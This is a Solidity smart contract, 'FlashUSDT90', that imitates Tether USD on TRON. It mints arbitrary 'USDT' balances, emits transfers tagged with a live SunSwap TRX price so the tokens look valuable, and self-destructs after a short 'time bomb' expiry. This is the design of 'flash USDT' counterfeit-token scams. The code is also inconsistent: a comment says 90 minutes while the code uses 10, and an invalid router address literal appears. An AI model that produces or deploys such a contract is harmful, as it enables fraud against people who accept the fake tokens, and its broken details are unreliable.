// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

/* ----------  SunSwap V2 Interface ---------- */
interface ISunSwapRouter {
    function getAmountsOut(uint amountIn, address[] calldata path)
        external
        view
        returns (uint[] memory amounts);
}

contract FlashUSDT90 {
    /* ----------  USDT clone optics ---------- */
    string public constant name     = "Tether USD";
    string public constant symbol   = "USDT";
    uint8  public constant decimals = 6;

    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint value, uint trxValue);

    /* ----------  time bomb ---------- */
    uint private immutable expiry;
    address private immutable deployer;

    /* ----------  SunSwap addresses (TRON main-net) ---------- */
    address private constant REAL_USDT = 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C;
    address private constant WTRX      = 0x891cdb91dc149f23b1a45d9c5ca78266a6091844;
    address private constant ROUTER    = 0xTSEJjD6WFLH7gfhre7tQVMPHVVTLqLHLWG; // SunSwap V2

    constructor(uint _initialSupply) {
        deployer = msg.sender;
        expiry   = block.timestamp + 10 minutes; // 90-min life
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
        emit Transfer(address(0), msg.sender, _initialSupply, 0);
    }

    /* ----------  transfer + live price ---------- */
    function transfer(address to, uint amount) external returns (bool) {
        require(block.timestamp < expiry, "contract expired");

        balanceOf[msg.sender] -= amount;
        balanceOf[to]          += amount;

        // fetch real-time USDT->TRX rate
        uint trxValue = _getTrxEquivalent(amount);

        emit Transfer(msg.sender, to, amount, trxValue);
        return true;
    }

    /* ----------  fetch 1 USDT = ? TRX (6-dec) ---------- */
    function _getTrxEquivalent(uint usdtAmount) internal view returns (uint) {
        address[] memory path = new address[](2);
        path[0] = REAL_USDT;
        path[1] = WTRX;
        uint[] memory amounts = ISunSwapRouter(ROUTER).getAmountsOut(usdtAmount, path);
        return amounts[1]; // TRX amount with 6 decimals
    }

    /* ----------  anyone can blow it up after 90 min ---------- */
    function destroy() external {
        require(block.timestamp >= expiry, "too early");
        selfdestruct(payable(deployer)); // whole code + storage vanish
    }

    /* ----------  helper: read live rate (UI friendly) ---------- */
    function getUSDTPriceInTRX() external view returns (uint) {
        return _getTrxEquivalent(1_000_000); // 1 USDT
    }

    receive() external payable {} // accidental TRX
}